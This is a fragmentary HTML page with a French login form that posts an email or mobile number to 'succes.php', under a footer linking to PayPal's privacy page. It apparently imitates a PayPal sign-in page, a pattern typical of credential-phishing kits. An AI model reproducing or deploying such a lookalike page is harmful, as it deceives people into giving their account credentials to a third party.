    ...
    <body>
        <div id="box">
            ...
            <form method="post" action="succes.php">
                <br><br><br>
                <input type="email" name="email" placeholder="Email ou numéro de mobile"><br><br>
        ...
        <div class="footer2">
            <p class="center">
                ...
                <a class="purge" href="https://www.paypal.com/fr/webapps/mpp/ua/privacy-full">Respect de la vie privée</a>
